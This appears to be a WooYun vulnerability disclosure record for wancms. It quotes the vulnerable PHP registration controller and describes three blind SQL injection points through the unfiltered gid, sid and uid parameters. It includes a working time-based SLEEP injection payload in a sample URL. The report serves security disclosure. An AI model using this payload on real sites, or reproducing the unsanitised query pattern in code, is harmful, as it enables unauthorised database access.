{"id": 84743, "wybug_id": "wooyun-2015-0143240", "wybug_title": "wancms sql盲注三处(比较鸡肋)", "wybug_corp": "wancms.com", "wybug_author": "不能忍", "wybug_date": "2015-10-12 11:07", "wybug_open_date": "2016-01-15 11:09", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-17：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-15：\t细节向公众公开  简要描述：  详细说明：  /app/Lib/Action/AccountsAction.class.php   //118行\npublic function username_check1() {\t\tunset ( $_SESSION ['uid'] );\t\tunset ( $_SESSION ['member'] );\t\tcookie ( 'auth', '1' );\t\t$html = uc_user_synlogout ();\t\t$callback = isset ( $_GET ['jsonpCallback'] ) ? $_GET ['jsonpCallback'] : 'jsonpCallback';\t    $gid = htmlspecialchars($_GET['gid']);\t    //并没有过滤\t\t\t//若sid、uid 丢失 获取相应最新的开服 uid默认为平台默认推广账号\t    $uid_1 = htmlspecialchars($_GET['uid']); //推广编号  查询出他的上级id//这个同样是没有过滤\t\t$username = strtolower(trim(htmlspecialchars($_GET ['cn'])));\t\t$password = trim ( htmlspecialchars($_GET ['pwd']) );\t\t$domain = $this->getdomain($_SERVER['HTTP_HOST']);\t\t$email = $username.'@'.$domain;\t\tif (! preg_match ( \"/^([a-zA-Z0-9]|[._]){5,22}$/\", $username )) {\t\t$data = \"{\\\"result\\\":\\\"err0003\\\"}\";\t\techo $callback . '(' . $data  . ')';die();\t\t}\t\tif (strlen ( $password ) < 6 || strlen ( $password ) > 22 || $password == \"\") {\t\t\t\t$data = \"{\\\"result\\\":\\\"err0006\\\"}\";\t\t\t\techo $callback . '(' . $data  . ')';die();\t\t\t}\t\t\t// #### 接入UC #####\t\t\t$uid = uc_user_register($username,$password,$email);\t\t\t$uid=321;\t\t\tif ($uid <= 0) {\t\t\t\tif ($uid == - 1) {\t\t\t\t\t$data = \"{\\\"result\\\":\\\"err0001\\\"}\";\t\t\t\t\techo $callback . '(' . $data  . ')';die();\t\t\t\t} elseif ($uid == - 2) {\t\t\t\t\t$data = \"{\\\"result\\\":\\\"err0001\\\"}\";\t\t\t\t\techo $callback . '(' . $data  . ')';die();\t\t\t\t} elseif ($uid == - 3) {\t\t\t\t\t$data = \"{\\\"result\\\":\\\"err0003\\\"}\";\t\t\t\t\techo $callback . '(' . $data  . ')';die();\t\t\t\t} elseif ($uid == - 4) {\t\t\t\t$data = \"{\\\"result\\\":\\\"err0001\\\"}\";\t\t\t\techo $callback . '(' . $data  . ')';die();\t\t\t\t} elseif ($uid == - 5) {\t\t\t\t\t$data = \"{\\\"result\\\":\\\"err0001\\\"}\";\t\t\t\t\techo $callback . '(' . $data  . ')';die();\t\t\t\t} elseif ($uid == - 6) {\t\t\t\t$data = \"{\\\"result\\\":\\\"err0001\\\"}\";\t\t\t\techo $callback . '(' . $data  . ')';die();\t\t\t\t} else {\t\t\t\t$data = \"{\\\"result\\\":\\\"err0001\\\"}\";\t\t\t\techo $callback . '(' . $data  . ')';die();\t\t\t\t}\t\t\t} else{\t\t// 注册成功\t\t\t\t$userinfo ['username'] = $username;\t\t\t\t$userinfo ['nickname'] = $username;\t\t\t\t$userinfo ['email'] = $email;\t\t\t\t$userinfo ['point'] = \"0\";\t\t\t\t$userinfo ['id_card'] = '';\t\t\t\t$userinfo ['uid'] = $uid;\t\t\t\t$model = M ( 'member' );\t\t\t\tif ($model->add ($userinfo)) {\t\t\t\t\t\t\t\t\t\t$extend = M ( 'member_extend_info' );\t\t\t\t\t$extends_info ['uid'] = $uid;\t\t\t\t\t$extends_info ['register_time'] = time ();\t\t\t\t\t$extends_info ['register_ip'] = get_client_ip ();\t\t\t\t\t$extends_info ['lastlogin_time'] = time ();\t\t\t\t\t$extends_info ['lastlogin_ip'] = get_client_ip ();\t\t\t\t\t$extends_info ['realname'] = '';\t\t\t\t\t$extends_info ['from_soical'] = 'cps';\t\t\t\t\t$extends_info ['gid'] = $gid;\t\t\t\t\t$extends_info ['sid'] = htmlspecialchars($_GET['sid']);\t\t\t\t\t$smodel = M('server');\t\t\t\t\t \t\t\t\t \tif($extends_info ['sid']){\t\t\t\t\t\t$extends_info ['sid'] = htmlspecialchars($_GET['sid']);   //这也没过滤\t\t\t\t\t}else{\t\t\t\t\t\t$s_info= $smodel->where(\"status = '0' and gid = \".$gid)->order('add_time desc')->select();\t\t\t\t\t\t$extends_info ['sid'] =$s_info[0]['sid'];\t\t\t\t\t} \t\t\t\t\t\t\t\t\t\t//确保sid与gid是同一款游戏\t\t\t\t\t$s_info1= $smodel->where(\"sid = \".$extends_info ['sid'])->find();    //这是第三处\t\t\t\t\tif($s_info1['gid']!=$extends_info ['gid']){\t\t\t\t\t\t$s_info= $smodel->where(\"status = '0' and gid = \".$gid)->order('add_time desc')->select();   //这是第一处\t\t\t\t\t\t$extends_info ['sid'] =$s_info[0]['sid'];\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t$sid = $extends_info ['sid'];\t\t\t\t\t//推广链接本身就是一级公会链接\t\t\t\t\tif($uid_1){\t\t\t\t\t\t$info = $extend->where (' grouping = 1 and uid ='.$uid_1)->find ();    //这是第二处\t\t\t\t\t\tif (empty($info)) {\t\t\t\t\t\t\t$extends_info ['sub_channels'] = '4';\t\t\t\t\t\t\t$extends_info ['total_channels'] = '4';\t\t\t\t\t\t\t\t\t\t\t\t\t\t}else{\t\t\t\t\t\t\t$extends_info ['sub_channels'] = $uid_1;\t\t\t\t\t\t\tif($info['subsign']=='0'){\t\t\t\t\t\t\t\t$extends_info ['total_channels'] = $uid_1;\t\t\t\t\t\t\t}else{\t\t\t\t\t\t\t\t$extends_info ['total_channels'] = $info['subsign'];\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t}else{\t\t\t\t\t\t$extends_info ['sub_channels'] = '4';\t\t\t\t\t\t$extends_info ['total_channels'] = '4';\t\t\t\t\t}\t\t\t\t\t $extend->add($extends_info);\t\t\t\t\t// 设置cookies\t\t\t\t\tsetcookie ('auth', uc_authcode ( $uid . \"\\t\" . $username, 'ENCODE' ), 0, C ( 'COOKIE_PATH' ), C ( 'COOKIE_DOMAIN' ), 0, false );\t\t\t\t\tsetcookie ( 'name', $username, time () + 3600, \"/\" );\t\t\t\t\t/**\t\t\t\t\t * **********************************\t\t\t\t\t*/\t\t\t\t\t// 防止本机注册\t\t\t\t\timport ( \"@.ORG.Getmacaddr\" );\t\t\t\t\t$mac = new GetMacAddr ( PHP_OS );\t\t\t\t\t$ip = get_client_ip ();\t\t\t\t\t$macaddr = $mac->mac_addr;\t\t\t\t\tsetcookie ( \"gameplf_anti_csrf\", md5 ( $macaddr ), time () + 3600 * 24, \"/\" );\t\t\t\t\tsetcookie ( \"login_check_ip\", md5 ( $ip ), time () + 3600 * 24, \"/\" );\t\t\t\t\t\t\t\t\t\t\t$ucsynlogin = uc_user_synlogin ( $uid );\t\t\t\t\t$_SESSION ['uid'] = $uid;\t\t\t\t\t$_SESSION ['member'] = $username;\t\t\t\t\t$ucsynlogin =str_replace('\"', \"'\", $ucsynlogin);\t\t\t\t\t$data=\"{\\\"result\\\":\\\"success\\\",\\\"gid\\\":\\\"$gid\\\",\\\"fid\\\":\\\"$sid\\\",\\\"login\\\":\\\"$ucsynlogin\\\"}\";\t\t\t\t\techo $callback . '(' . $data  . ')';die();\t\t\t\t\t\t\t\t\t\t\t\t\t\t} else {\t\t\t\t\t$data = \"{\\\"result\\\":\\\"err0001\\\"}\";\t\t\t\t\techo $callback . '(' . $data  . ')';die();\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t}\n这三处都没过滤，但是有个问题，已经注册过的用户是不能再注册的。所以每次注入的时候都必须使用不同的用户名来进行注入。而且页面不回显，只能盲注了。这个必须写脚本才能测试。所以比较鸡肋,但是注入还是存在的给个payload测试一下。http://localhost/accounts/username_check1/?gid=1&cn=test1ees&pwd=111111&sid=0&uid=1) AND (SELECT * FROM (SELECT(SLEEP(6)))test) AND 'wooyun'='wooyun'%23   漏洞证明：  \n\n   修复方案：     版权声明：转载请注明来源 不能忍@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-01-15 11:09 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}